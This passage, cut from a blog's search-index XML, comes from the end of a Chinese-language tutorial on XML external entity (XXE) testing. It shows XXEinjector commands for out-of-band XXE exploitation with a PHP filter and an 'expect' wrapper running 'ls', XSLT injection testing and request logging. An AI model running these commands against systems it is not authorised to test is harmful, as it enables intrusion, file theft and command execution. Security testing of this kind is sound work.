bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter--expect=<span class="built_in">ls</span></span><br></pre></td></tr></table></figure><p>测试XSLT注入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt –xslt</span><br></pre></td></tr></table></figure><p>记录请求信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --logger --oob=http--output=/tmp/out.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XML </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
